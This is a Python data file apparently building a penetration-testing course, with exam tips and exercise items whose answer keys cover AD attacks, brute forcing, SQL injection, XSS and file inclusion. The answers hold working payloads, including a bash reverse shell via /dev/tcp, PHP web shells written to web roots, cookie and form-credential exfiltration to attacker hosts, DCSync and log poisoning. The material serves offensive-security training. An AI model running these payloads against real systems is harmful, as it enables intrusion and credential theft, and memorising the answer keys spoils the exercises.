  "pitfalls_md":"<ul><li><b>Running linPEAS and not reading the output</b> — linPEAS colour-codes findings (red=high, yellow=interesting). Many students run it but don't read the yellow section carefully. Red findings are not always exploitable; yellow often are.</li><li><b>Missing sudo -l as the first check</b> — sudo -l is the single highest-value check on Linux targets — many environments give limited sudo without password for specific commands that have GTFOBins escape paths. Run it before any automated tool.</li><li><b>Not checking GTFOBins for every unusual SUID binary</b> — Non-standard SUID binaries (curl, wget, python, perl, vim, script) have known escalation paths at gtfobins.github.io. Don't pass over uncommon SUIDs without checking.</li><li><b>Skipping cron job analysis</b> — Root-run cron jobs with writable scripts are reliable escalation paths. Check /etc/crontab, /etc/cron.d/, and use pspy64 to view cron jobs running in real-time without root access.</li><li><b>Using kernel exploits as the first attempt</b> — Kernel exploits are unreliable, crash systems, and leave forensic artifacts. Exhaust all misconfigurations and sudo/SUID paths before attempting kernel exploitation.</li></ul>",
  "exam_tips_md":"<ul><li>sudo -l is always the first command on any Linux target. One writable sudo entry with GTFOBins escape is instant root. Memorise the top 10 GTFOBins sudo escapes (vim, find, awk, python, etc.).</li><li>linPEAS outputs a lot of text — pipe to a file and grep: /tmp/lp.sh | tee /tmp/lp.out, then grep -i 'suid\\|sudo\\|writable\\|password\\|cron' /tmp/lp.out for quick prioritisation.</li><li>Check /var/www/html/config.php, /var/www/html/.env, and application config files after gaining www-data shell — database passwords are frequently reused as system user passwords for SSH or su.</li><li>pspy64 is invaluable for discovering cron jobs running without explicit crontab entry. Transfer it, run it for 2-3 minutes, and look for root-executed scripts in the output.</li><li>If running as a service account (www-data, tomcat), check if the web application has database credentials in config files. Those credentials often work for SSH, su, or other services — credential reuse is the most common privilege escalation path in CPTS.</li></ul>"
},
]

# Process: add/update each module
for nm in new_modules:
    if nm['slug'] not in existing_slugs:
        modules_expanded.append(nm)
        existing_slugs.add(nm['slug'])
    else:
        for i, m in enumerate(modules_expanded):
            if m['slug'] == nm['slug']:
                modules_expanded[i] = nm
                break

save('modules-expanded.json', modules_expanded)
print(f"modules-expanded.json: {len(modules_expanded)} total entries")

# ─────────────────────────────────────────────────────────────────────────────
# EXERCISES (modules 12-24, 5 each = 65 exercises)
# ─────────────────────────────────────────────────────────────────────────────
new_exercises = [

# Module 12 – AD Enumeration & Attacks
{"module_id":12,"type":"fill_command","difficulty":"medium","prompt":"Write the BloodHound.py command to collect all AD data from corp.local (DC: 10.10.10.5) as user 'john' with password 'Pass123', using the local DC as DNS:","options":None,"answer":"bloodhound-python -d corp.local -u john -p Pass123 -dc 10.10.10.5 -c All -ns 10.10.10.5","explanation":"bloodhound-python runs collection from Linux without domain join. -c All collects all data types. -ns sets DNS server to DC (required for proper LDAP connectivity). Output is a ZIP importable into BloodHound.","validation_regex":"bloodhound-python.*-d corp\\.local.*-c All|-ns 10\\.10\\.10\\.5","hints":["-ns sets the DNS server to the DC","-c All collects all data types"]},
{"module_id":12,"type":"fill_command","difficulty":"hard","prompt":"Write the Impacket-secretsdump command to perform a DCSync attack against corp.local DC at 10.10.10.5, using domain admin credentials, and extract only NTLM hashes:","options":None,"answer":"impacket-secretsdump corp.local/administrator:Password123@10.10.10.5 -just-dc-ntlm","explanation":"-just-dc-ntlm performs DCSync (not local SAM extraction) and outputs only NTLM hashes for every domain account. This requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges (Domain Admin has these by default).","validation_regex":"secretsdump.*corp\\.local.*administrator.*10\\.10\\.10\\.5.*just-dc-ntlm","hints":["-just-dc-ntlm is the DCSync flag","Requires replication privileges on the DC"]},
{"module_id":12,"type":"multiple_choice","difficulty":"medium","prompt":"What BloodHound query reveals accounts that have a path to Domain Admin but are not themselves Domain Admins?","options":["Find all Domain Admins","Shortest Paths to Domain Admins from Owned Principals","Find Computers with Unconstrained Delegation","List all SPNs"],"answer":"Shortest Paths to Domain Admins from Owned Principals","explanation":"This query shows all principals you've marked as 'owned' (compromised) and the shortest path from each to Domain Admin. It's the primary analysis query in CPTS — run it immediately after importing BloodHound data and marking your initial foothold as owned.","validation_regex":None,"hints":["Mark compromised accounts as 'owned' first","The query shows paths from your current access to DA"]},
{"module_id":12,"type":"fill_command","difficulty":"medium","prompt":"Using PowerView, write the command to find all domain users who have the 'Description' field populated (potential password storage):","options":None,"answer":"Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description -ne $null} | Select-Object samaccountname,description","explanation":"Admins frequently store passwords in AD user Description fields. This PowerView command filters for non-null descriptions and displays username + description. Equivalent with LDAP: ldapsearch -x -H ldap://DC -D 'user@corp.local' -w password -b 'DC=corp,DC=local' '(description=*)' samaccountname description","validation_regex":"Get-DomainUser.*description|samaccountname.*description","hints":["Filter where description is not null","Use Select-Object for clean output"]},
{"module_id":12,"type":"case_file","difficulty":"hard","prompt":"After Kerberoasting, you crack the hash for svc_sql:Winter2024!. Describe the next 4 steps to escalate to Domain Admin using this credential.","options":None,"answer":"Step 1 — Validate credential: nxc smb 10.10.10.5 -u svc_sql -p 'Winter2024!' → look for [+] and (Pwn3d!) for local admin.\nStep 2 — BloodHound analysis: in BloodHound, right-click svc_sql → Mark as Owned → run 'Shortest Paths from Owned Principals to Domain Admins' to see attack path.\nStep 3 — Check for ACL abuse: if svc_sql has GenericAll/WriteDACL on any object in the path, exploit it (e.g., force password reset on a DA account, add svc_sql to Domain Admins).\nStep 4 — If svc_sql has local admin on a server where a DA is logged in: dump credentials with secretsdump or Mimikatz to get DA's NTLM hash → PTH to DC.","explanation":"Every cracked service account must be immediately validated and analysed in BloodHound. The path from Kerberoasted account to DA almost always exists — BloodHound finds it automatically.","validation_regex":"(?i)bloodhound|BloodHound|nxc|secretsdump|Pwn3d|ACL|WriteDACL","hints":["Mark as owned in BloodHound first","Look for ACL-based paths to DA"]},

# Module 13 – Web Proxies
{"module_id":13,"type":"fill_command","difficulty":"easy","prompt":"Write the curl command to send a GET request to http://target.com/api/users through Burp Suite proxy running on 127.0.0.1:8080, ignoring SSL certificate errors:","options":None,"answer":"curl -x http://127.0.0.1:8080 -k http://target.com/api/users","explanation":"-x specifies the proxy. -k ignores SSL certificate errors (since Burp uses its own CA). This routes curl requests through Burp for interception, logging, and modification.","validation_regex":"curl.*-x.*127\\.0\\.0\\.1:8080.*-k|curl.*-k.*-x.*8080","hints":["-x sets the proxy address","-k ignores SSL cert errors"]},
{"module_id":13,"type":"multiple_choice","difficulty":"medium","prompt":"In Burp Suite Intruder, which attack type would you use to test all combinations of a username list (50 entries) and a password list (100 entries)?","options":["Sniper","Battering Ram","Pitchfork","Cluster Bomb"],"answer":"Cluster Bomb","explanation":"Cluster Bomb tests every combination: 50 usernames × 100 passwords = 5000 total requests. Pitchfork would only test 50 pairs in parallel (username[1]+password[1], username[2]+password[2]). Sniper tests one position at a time. Cluster Bomb is the correct choice for credential brute-force.","validation_regex":None,"hints":["How many total requests will each attack type generate?","Which tests ALL combinations?"]},
{"module_id":13,"type":"fill_command","difficulty":"medium","prompt":"Write the curl command to send a JSON POST request to http://target.com/api/login with body {\"username\":\"admin\",\"password\":\"test\"} through Burp proxy:","options":None,"answer":"curl -x http://127.0.0.1:8080 -k -X POST http://target.com/api/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}'","explanation":"JSON APIs require Content-Type: application/json header. -d sends request body. -X POST specifies the method. Without Content-Type, many APIs reject the request or misparse the body.","validation_regex":"curl.*Content-Type.*application/json.*-d.*username.*admin|curl.*-X POST.*application/json","hints":["-H sets headers","-d is the request body"]},
{"module_id":13,"type":"decision_tree","difficulty":"medium","prompt":"You're testing a web app and notice a JWT token in the Authorization header. What is the correct attack sequence?","options":["Ignore it — JWTs are secure","Decode it in Burp Decoder → check algorithm → try alg:none attack → if HS256, try weak secret brute-force → check claims for privilege escalation","Brute-force the entire token","Change the token to 'admin' and forward"],"answer":"Decode it in Burp Decoder → check algorithm → try alg:none attack → if HS256, try weak secret brute-force → check claims for privilege escalation","explanation":"JWT attacks: (1) alg:none removes signature verification — change algorithm to 'none', remove signature. (2) Weak HS256 secrets — crack with jwt_tool or hashcat. (3) Claim modification — change role:user to role:admin if signature validation is broken. Use Burp JWT Editor extension for in-Repeater manipulation.","validation_regex":"(?i)alg.*none|HS256|jwt|Decode","hints":["Always decode the JWT payload first","What happens if you set alg to none?"]},
{"module_id":13,"type":"case_file","difficulty":"hard","prompt":"You find an API endpoint GET /api/v1/export?format=pdf that downloads reports. The response takes 3 seconds. When you change format=pdf to format=pdf; sleep 5, the response takes 8 seconds. What vulnerability is present and what are your next steps?","options":None,"answer":"This is command injection. The 'format' parameter is passed to an OS command (likely something like: convert file.html output.{format}) without sanitisation. The 5-second sleep confirms blind OS command injection.\nNext steps: (1) Confirm with a different payload: format=pdf; ping -c 3 10.10.14.5 — run tcpdump on attacker to confirm ICMP receipt. (2) Establish reverse shell: format=pdf; bash -i >%26 /dev/tcp/10.10.14.5/4444 0>%261 (URL-encoded). (3) Alternatively: write a shell to the web root: format=pdf; echo 'PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+' | base64 -d > /var/www/html/shell.php","explanation":"Time-delay confirmation is the gold standard for blind command injection. URL-encoding the redirect operators is necessary for GET parameters.","validation_regex":"(?i)command injection|blind|sleep|reverse shell|ping","hints":["The time difference confirms the sleep executed","URL-encode special characters in GET parameters"]},

# Module 14 – Ffuf
{"module_id":14,"type":"fill_command","difficulty":"medium","prompt":"Write the ffuf command to enumerate virtual hosts on IP 10.10.10.5, testing subdomains from subdomains-top1million-5000.txt for domain target.com, filtering responses with size 1234:","options":None,"answer":"ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.10.5 -H 'Host: FUZZ.target.com' -fs 1234","explanation":"Vhost enumeration manipulates the Host header while keeping the IP constant. -fs 1234 filters out the default response size (the base response without a valid vhost). The size to filter is determined by running once without -fs and noting the standard response size.","validation_regex":"ffuf.*subdomains.*Host.*FUZZ\\.target\\.com.*-fs|ffuf.*-H.*Host.*FUZZ","hints":["FUZZ goes in the Host header","Filter by the default response size with -fs"]},
{"module_id":14,"type":"fill_command","difficulty":"medium","prompt":"Write the ffuf command to discover hidden GET parameters on http://target.com/search.php, using burp-parameter-names.txt, filtering responses that are 1024 bytes:","options":None,"answer":"ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://target.com/search.php?FUZZ=value' -fs 1024","explanation":"Parameter fuzzing places FUZZ in the parameter name position while keeping a static value. Parameters that cause a different response size than the baseline (filtered with -fs 1024) are potentially valid. Follow up by testing interesting parameters in Burp Repeater.","validation_regex":"ffuf.*burp-parameter-names.*FUZZ=value|ffuf.*search\\.php.*FUZZ","hints":["FUZZ replaces the parameter name","Filter out the baseline response size"]},
{"module_id":14,"type":"multiple_choice","difficulty":"easy","prompt":"What ffuf flag enables recursive directory discovery?","options":["-r","-recursion","-R","-depth"],"answer":"-recursion","explanation":"-recursion makes ffuf automatically fuzz subdirectories of discovered directories. Use with -recursion-depth N to limit depth (default is unlimited). This discovers multi-level directory structures without manually running ffuf for each discovered directory.","validation_regex":None,"hints":["The flag name matches the function"," Add -recursion-depth to control how deep"]},
{"module_id":14,"type":"fill_command","difficulty":"hard","prompt":"Write the ffuf command to brute-force a login form at http://target.com/login using POST, fuzzing only the password field, with username fixed as 'admin', filtering by 302 redirect (success = 302), using rockyou.txt:","options":None,"answer":"ffuf -w /usr/share/wordlists/rockyou.txt -u http://target.com/login -X POST -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -mc 302","explanation":"-mc 302 matches only responses with 302 status code (redirect = successful login). Failed logins return 200 (same login page). This is more reliable than -fs (size filtering) when the failure response size varies.","validation_regex":"ffuf.*rockyou.*POST.*username=admin.*password=FUZZ.*-mc 302|ffuf.*-mc 302.*login","hints":["-mc matches specific response codes","Success usually redirects (302), failure returns 200"]},
{"module_id":14,"type":"decision_tree","difficulty":"medium","prompt":"ffuf discovers /backup/ returns 301, /api/ returns 200, and /old-site/ returns 403. Which should you investigate first and why?","options":["/backup/ — 301 always means interesting","All three equally","/api/ then /backup/ — 200 is accessible, /backup/ may have content behind the redirect, /403 may be bypassable","Only /api/ — ignore 301 and 403"],"answer":"/api/ then /backup/ — 200 is accessible, /backup/ may have content behind the redirect, /403 may be bypassable","explanation":"/api/ returning 200 is immediately accessible — run ffuf recursively against it. /backup/ returning 301 likely redirects to /backup (trailing slash) — follow it and then recurse inside. /old-site/ returning 403 may be bypassable with HTTP verb tampering, X-Forwarded-For: 127.0.0.1 headers, or path variations (/old-site/../old-site/).","validation_regex":None,"hints":["200 = accessible now","301 redirect to where?","403 may be bypassable"]},

# Module 15 – Login Brute Forcing
{"module_id":15,"type":"fill_command","difficulty":"medium","prompt":"Write the hydra command to brute-force an HTTP POST login form at http://10.10.10.5/login with the username list users.txt and password list passwords.txt, where a failed login returns the text 'Invalid credentials':","options":None,"answer":"hydra -L users.txt -P passwords.txt 10.10.10.5 http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid credentials'","explanation":"^USER^ and ^PASS^ are hydra placeholders for username and password. The F= prefix means the following string appears on FAILURE. Get the exact field names and failure string from a test login in Burp Repeater first.","validation_regex":"hydra.*-L users\\.txt.*-P passwords\\.txt.*http-post-form.*Invalid credentials","hints":["F= means the string appears on failed login","^USER^ and ^PASS^ are replaced by hydra"]},
{"module_id":15,"type":"fill_command","difficulty":"easy","prompt":"Write the cewl command to generate a custom wordlist from http://target.com crawling 3 levels deep, with minimum word length 6, saving to target_words.txt:","options":None,"answer":"cewl http://target.com -d 3 -m 6 -o target_words.txt","explanation":"cewl spiders the target website and extracts unique words. -d 3 crawls 3 levels deep, -m 6 sets minimum word length (eliminates short words), -o saves to file. The resulting wordlist reflects the organisation's own terminology — frequently used in passwords.","validation_regex":"cewl.*http://target\\.com.*-d 3.*-m 6.*-o target_words\\.txt|cewl.*-d.*-m.*-o","hints":["-d controls crawl depth","-m sets minimum word length"]},
{"module_id":15,"type":"multiple_choice","difficulty":"medium","prompt":"A web application login form includes a CSRF token that changes with every request. Standard hydra fails. What is the correct approach?","options":["Ignore CSRF and keep trying","Use Burp Intruder with 'Recursive grep' to extract and reuse the CSRF token per request","Use medusa instead of hydra","Disable CSRF in the browser settings"],"answer":"Use Burp Intruder with 'Recursive grep' to extract and reuse the CSRF token per request","explanation":"Burp Intruder's 'Recursive grep' macro extracts the CSRF token from the previous response and embeds it in the next request. This handles dynamic tokens that standard tools can't manage. Configure in: Intruder → Options → Macro → Extract from previous response.","validation_regex":None,"hints":["CSRF tokens must be fetched before each request","Burp macros can handle this automatically"]},
{"module_id":15,"type":"case_file","difficulty":"hard","prompt":"You find an SSH service on port 22 and identify the username 'admin' from a web application. You generate a custom wordlist using cewl (1200 words from the company site) and cupp (500 personalised entries). How do you proceed with brute-force while minimising detection?","options":None,"answer":"Step 1 — Try top 20 default passwords first (admin, password, 123456, company_name) manually — takes 2 minutes, may succeed immediately.\nStep 2 — Combine wordlists: cat cewl.txt cupp.txt | sort -u > combined.txt\nStep 3 — Run hydra with low threads: hydra -l admin -P combined.txt ssh://10.10.10.5 -t 4 -w 5\n  -t 4 limits threads, -w 5 sets wait time between connection attempts.\nStep 4 — Monitor for lockout: if SSH starts refusing connections, wait 10-15 minutes.\nStep 5 — If combined list fails, try rockyou.txt with -t 2 (very slow, stealthy).\nNote: SSH logs every failed attempt in /var/log/auth.log — this will be detectable.","explanation":"SSH brute-force is always detectable in logs. Custom wordlists are smaller and more targeted. Low thread count reduces lockout and log noise.","validation_regex":"(?i)hydra|cewl|cupp|combined|threads|-t 4","hints":["Start with small targeted lists","Low thread count reduces detection risk"]},
{"module_id":15,"type":"decision_tree","difficulty":"easy","prompt":"You need to brute-force a login on a web app that returns HTTP 200 for both success and failure, but the success page contains 'Welcome, admin' and the failure page contains 'Login failed'. Which hydra flag do you use and how?","options":["F=Login failed (failure string)","S=Welcome, admin (success string)","Both F= and S=","Neither — use -mc 200"],"answer":"S=Welcome, admin (success string)","explanation":"When you know the success string, use S= (success string) — hydra reports a hit when this string appears. F= is for failure strings. Both work but you typically know one more reliably than the other. In this case, S=Welcome, admin is ideal.","validation_regex":None,"hints":["S= means string appears on SUCCESS","F= means string appears on FAILURE"]},

# Module 16 – SQL Injection
{"module_id":16,"type":"fill_command","difficulty":"medium","prompt":"Write the SQL payload to enumerate all table names in the current database using UNION-based injection, assuming 3 columns with the output in column 2:","options":None,"answer":"UNION SELECT 1,group_concat(table_name separator ', '),3 FROM information_schema.tables WHERE table_schema=database() --","explanation":"group_concat concatenates all table names into a single string. information_schema.tables contains metadata for all tables. table_schema=database() filters to only the current database's tables. The -- comments out the rest of the original query.","validation_regex":"UNION SELECT.*group_concat.*table_name.*information_schema\\.tables.*table_schema.*database\\(\\)|UNION.*information_schema.*tables","hints":["Use information_schema.tables","group_concat combines multiple rows into one string"]},
{"module_id":16,"type":"fill_command","difficulty":"easy","prompt":"Write the SQL injection payload to determine the number of columns in a SELECT query using the ORDER BY technique, starting from 1:","options":None,"answer":"ORDER BY 1 --\nORDER BY 2 --\nORDER BY 3 --\n(continue until error — N-1 columns is the count)","explanation":"ORDER BY N sorts by column N. When N exceeds the column count, the database returns an error. Increment from 1 until the error appears — that N-1 is the column count. This is more reliable than UNION SELECT for column counting because the error is clear and unambiguous.","validation_regex":"ORDER BY [0-9]+ --","hints":["Increment until you get an error","Error on ORDER BY N means N-1 columns"]},
{"module_id":16,"type":"multiple_choice","difficulty":"hard","prompt":"A web application parameter is vulnerable to SQL injection but returns no visible output and does not return different content for true/false conditions. How do you confirm and exploit this?","options":["It's not injectable","Use UNION-based injection","Use time-based blind SQL injection (SLEEP/WAITFOR DELAY)","Use error-based injection"],"answer":"Use time-based blind SQL injection (SLEEP/WAITFOR DELAY)","explanation":"When there's no output difference between true/false (not boolean-blind), time-based injection is the fallback. SLEEP(5) delays the response by 5 seconds if injected successfully — this confirms injection regardless of response content or status code. Data is then extracted via conditional time delays: IF(substring(database(),1,1)='a',SLEEP(5),0).","validation_regex":None,"hints":["No output = need a side channel","Time delay is a reliable side channel"]},
{"module_id":16,"type":"fill_command","difficulty":"hard","prompt":"Write the MySQL SQL injection payload to write a PHP web shell to /var/www/html/shell.php using INTO OUTFILE, assuming UNION injection with 3 columns:","options":None,"answer":"UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php' --","explanation":"INTO OUTFILE writes query results to a file. The PHP shell goes in column 2. Requires: FILE privilege granted to MySQL user, secure_file_priv='' (or path matching), and write permission to the web root. After execution: access http://target.com/shell.php?cmd=id.","validation_regex":"UNION SELECT.*INTO OUTFILE.*shell\\.php|INTO OUTFILE.*var/www","hints":["INTO OUTFILE after the SELECT columns","Requires FILE privilege and write access to web root"]},
{"module_id":16,"type":"case_file","difficulty":"medium","prompt":"A login form at http://target.com/login uses POST with fields username and password. Entering admin'-- in the username field logs you in as admin without a password. Explain why this works and extract the complete users table.","options":None,"answer":"The application's query is likely: SELECT * FROM users WHERE username='INPUT' AND password='INPUT2'\nWith admin'-- injected as username: SELECT * FROM users WHERE username='admin'-- AND password=''\nThe -- comments out the password check, so only the username condition is evaluated. Since 'admin' exists, login succeeds.\n\nTo extract the users table:\n1. Find column count: admin' ORDER BY 1--  (increase until error)\n2. Find printable columns: admin' UNION SELECT 1,2,3--\n3. Extract: admin' UNION SELECT 1,group_concat(username,':',password),3 FROM users--","explanation":"Authentication bypass via SQL injection works by commenting out the password condition. The attacker only needs to know a valid username (admin, administrator) — the password can be anything (or empty).","validation_regex":"(?i)comment|--.*AND|UNION SELECT.*users|group_concat.*password","hints":["What does -- do to the rest of the query?","How does UNION extend the original query?"]},

# Module 17 – SQLMap
{"module_id":17,"type":"fill_command","difficulty":"medium","prompt":"Write the sqlmap command to test a POST request saved in request.txt, targeting the 'id' parameter, using level 3 and specifying MySQL as the DBMS, running non-interactively:","options":None,"answer":"sqlmap -r request.txt -p id --dbms=mysql --level=3 --batch","explanation":"-r request.txt feeds the full HTTP request (headers + body). -p id targets only the id parameter. --dbms=mysql skips testing other DB types, significantly reducing runtime. --level=3 increases test depth. --batch answers all prompts automatically.","validation_regex":"sqlmap -r request\\.txt.*-p id.*--dbms=mysql.*--level=3.*--batch|sqlmap.*request\\.txt.*mysql.*level.*batch","hints":["-p specifies the parameter to test","--batch enables non-interactive mode"]},
{"module_id":17,"type":"fill_command","difficulty":"medium","prompt":"After sqlmap confirms injection, write the command to dump the 'username' and 'password' columns from the 'users' table in database 'webapp':","options":None,"answer":"sqlmap -r request.txt --batch -D webapp -T users -C username,password --dump","explanation":"-D specifies database, -T specifies table, -C specifies columns, --dump extracts the data. sqlmap automatically detects and attempts to crack any found password hashes using its built-in dictionary.","validation_regex":"sqlmap.*-D webapp.*-T users.*-C username,password.*--dump|sqlmap.*--dump.*webapp.*users","hints":["-D database, -T table, -C columns","--dump extracts the data"]},
{"module_id":17,"type":"multiple_choice","difficulty":"medium","prompt":"Which sqlmap tamper script replaces spaces with /* */ comments to bypass WAF filters?","options":["randomcase","between","space2comment","charunicodeencode"],"answer":"space2comment","explanation":"space2comment replaces spaces with /**/ which is equivalent in SQL but bypasses WAFs that look for spaces between keywords. Example: SELECT/**/*/**FROM/**users becomes SELECT * FROM users when parsed by MySQL. Chain with other tampers: --tamper=space2comment,randomcase.","validation_regex":None,"hints":["The name describes what it does to spaces","/**/ is a SQL comment that equals a space"]},
{"module_id":17,"type":"fill_command","difficulty":"hard","prompt":"Write the sqlmap command to attempt obtaining an interactive OS shell on target via SQL injection (from request.txt), using the --os-shell flag:","options":None,"answer":"sqlmap -r request.txt --os-shell --batch","explanation":"--os-shell attempts to upload and execute a backdoor for interactive OS access. On MySQL: uses INTO OUTFILE to write a PHP/ASP shell to the web root. On MSSQL: uses xp_cmdshell. Requires elevated DB privileges and filesystem write access to the web root.","validation_regex":"sqlmap.*request\\.txt.*--os-shell.*--batch|sqlmap.*--os-shell","hints":["--os-shell requires FILE privilege or xp_cmdshell","It writes a backdoor to get command execution"]},
{"module_id":17,"type":"decision_tree","difficulty":"medium","prompt":"sqlmap returns: '[WARNING] it seems that the website is protected by a WAF/IPS' and marks all tests as false positives. What is your next approach?","options":["Give up and try a different vulnerability","Use manual SQLi in Burp Repeater since automation is blocked","Apply tamper scripts (--tamper=space2comment,randomcase) and increase level/risk, or use manual SQLi","Delete the WAF"],"answer":"Apply tamper scripts (--tamper=space2comment,randomcase) and increase level/risk, or use manual SQLi","explanation":"WAF detection in sqlmap doesn't mean no SQLi exists — it means the automated payloads are being blocked. Tamper scripts encode payloads differently to evade signature-based WAFs. If tampers fail, manual testing in Burp Repeater with custom payloads often bypasses WAFs that automated tools can't.","validation_regex":None,"hints":["WAF detection ≠ no vulnerability","Tamper scripts change payload encoding"]},

# Module 18 – XSS
{"module_id":18,"type":"fill_command","difficulty":"medium","prompt":"Write a JavaScript payload (for injection into a stored XSS sink) that sends the victim's session cookie to your attacker server at http://10.10.14.5/collect:","options":None,"answer":"<script>new Image().src='http://10.10.14.5/collect?c='+encodeURIComponent(document.cookie)</script>","explanation":"new Image().src causes the browser to make a GET request to the specified URL — effectively sending the cookie to the attacker's server. encodeURIComponent handles special characters in the cookie value. The attacker captures this with nc -lvnp 80 or a Python HTTP server.","validation_regex":"document\\.cookie.*10\\.10\\.14\\.5|Image.*src.*collect.*cookie","hints":["new Image().src triggers an HTTP request","encodeURIComponent handles special characters in cookies"]},
{"module_id":18,"type":"multiple_choice","difficulty":"easy","prompt":"An input field reflects your input but encodes < and > as &lt; and &gt;. Which XSS technique may still work?","options":["Script tag injection","HTML entity encoding bypass","Inject into an existing HTML attribute context using event handlers — no < or > needed","It's not exploitable"],"answer":"Inject into an existing HTML attribute context using event handlers — no < or > needed","explanation":"If the reflection is inside an HTML attribute (e.g., value=\"INJECT\"), closing the attribute and adding an event handler doesn't require </>: \" onmouseover=\"alert(1). This payload closes the current attribute string, adds an event handler, and the closing > is part of the existing tag — no new tags needed.","validation_regex":None,"hints":["Where is the input reflected — inside a tag attribute?","Event handlers don't require angle brackets"]},
{"module_id":18,"type":"fill_command","difficulty":"hard","prompt":"A page has this JavaScript: var searchTerm = ''+location.search.split('term=')[1]+''; document.getElementById('out').innerHTML = searchTerm; — Write the URL to exploit this DOM XSS:","options":None,"answer":"http://target.com/search?term=<img src=x onerror=alert(1)>","explanation":"The JavaScript reads location.search (the URL query string), splits on 'term=', and writes the value directly to innerHTML — a DOM XSS sink. The payload <img src=x onerror=alert(1)> executes when innerHTML renders the invalid image src and triggers onerror. No server interaction needed — this is pure client-side.","validation_regex":"term=.*img.*onerror|term=.*onerror.*alert|term=.*script.*alert","hints":["innerHTML is a XSS sink","The payload goes in the 'term' URL parameter"]},
{"module_id":18,"type":"case_file","difficulty":"hard","prompt":"You find stored XSS in a blog comment field that displays to all users including admins. However, session cookies have HttpOnly flag set. Describe two alternative XSS impact demonstrations beyond cookie theft.","options":None,"answer":"1. Force admin action (CSRF via XSS): The XSS can read CSRF tokens from the DOM (since same-origin) and submit authenticated requests. Example: fetch('/admin/create_user', {method:'POST', body:'username=attacker&role=admin', credentials:'include'}) — creates an admin account using the victim's session.\n2. Keylogger/credential capture: inject a keylogger that captures all keystrokes or override the admin's login form with a phishing form that captures credentials: document.querySelector('form').addEventListener('submit', e => { fetch('http://attacker.com/log?data='+JSON.stringify({u: form.username.value, p: form.password.value})); });","explanation":"HttpOnly prevents JavaScript from reading cookies, but XSS in an authenticated session can still perform any action the victim can perform — including creating admin accounts, changing passwords, and capturing form input.","validation_regex":"(?i)fetch|CSRF|credentials|keylog|form.*submit|admin","hints":["XSS has same-origin access to CSRF tokens","JavaScript can submit forms on behalf of victims"]},
{"module_id":18,"type":"fill_command","difficulty":"easy","prompt":"Write the basic XSS detection payload that uses an image tag with an onerror handler to trigger alert(1):","options":None,"answer":"<img src=x onerror=alert(1)>","explanation":"When the browser tries to load 'x' as an image source (which fails), the onerror event fires and executes alert(1). This payload works even when <script> tags are filtered, because it uses an HTML event attribute instead. Variations: <svg onload=alert(1)>, <body onload=alert(1)>.","validation_regex":"<img src=x onerror=alert\\(1\\)>|img.*onerror.*alert","hints":["The invalid image src triggers onerror","No script tags needed for event-handler payloads"]},

# Module 19 – File Inclusion
{"module_id":19,"type":"fill_command","difficulty":"medium","prompt":"Write the URL to read /etc/passwd via LFI in the parameter 'page' on http://target.com/index.php, using path traversal with 5 levels:","options":None,"answer":"http://target.com/index.php?page=../../../../../etc/passwd","explanation":"Each ../ goes up one directory level. 5 levels ensures you reach the root regardless of where the web application's working directory is. From /var/www/html: ../../../../../ goes to /. Always try various depths (3,4,5,6) as the depth depends on the application's working directory.","validation_regex":"page=\\.\\./\\.\\./\\.\\./.*etc/passwd|index\\.php.*\\.\\./.*etc/passwd","hints":["Each ../ moves up one directory","5 levels covers most web root depths"]},
{"module_id":19,"type":"fill_command","difficulty":"hard","prompt":"Write the curl command to perform log poisoning: inject a PHP web shell into the Apache access log via the User-Agent header, then access the log via LFI to execute 'id':","options":None,"answer":"# Step 1: Inject PHP into access log via User-Agent\ncurl http://target.com/ -A '<?php system($_GET[\"cmd\"]); ?>'\n# Step 2: Include log file via LFI with command\ncurl 'http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id'","explanation":"Apache logs the User-Agent header in access.log. By injecting PHP code as the User-Agent, that PHP code gets written to the log. When the LFI includes the log file, PHP executes the injected code. The cmd parameter controls what command runs.","validation_regex":"curl.*-A.*php.*system|access\\.log.*cmd=id|log poisoning","hints":["User-Agent gets logged in access.log","Include the log file via the LFI parameter"]},
{"module_id":19,"type":"multiple_choice","difficulty":"medium","prompt":"What PHP wrapper reads the source code of a PHP file (without executing it) via LFI?","options":["file:///path/to/file","php://input","php://filter/convert.base64-encode/resource=filename","data://text/plain,content"],"answer":"php://filter/convert.base64-encode/resource=filename","explanation":"php://filter applies a filter chain to a resource before returning it. convert.base64-encode encodes the file as base64, preventing PHP execution and returning the raw source as readable base64. Decode with: echo 'BASE64' | base64 -d > file.php. Use resource= without .php extension if the application appends it automatically.","validation_regex":None,"hints":["The filter converts the content before PHP processes it","Base64 encoding prevents execution, allowing source code reading"]},
{"module_id":19,"type":"fill_command","difficulty":"hard","prompt":"Write the URL to exploit RFI — include a PHP web shell hosted at http://10.10.14.5:8000/shell.php via the 'lang' parameter on http://target.com/index.php, and execute 'id':","options":None,"answer":"http://target.com/index.php?lang=http://10.10.14.5:8000/shell.php&cmd=id","explanation":"RFI includes files from external URLs when allow_url_include=On in php.ini. The web server fetches http://10.10.14.5:8000/shell.php and executes it as PHP. Host shell.php: echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php && python3 -m http.server 8000. The cmd parameter is passed to the included shell.","validation_regex":"lang=http://10\\.10\\.14\\.5.*shell\\.php.*cmd=id|lang=http://.*shell.*cmd","hints":["RFI uses an HTTP URL as the file path","Your attacker's HTTP server hosts the malicious PHP file"]},
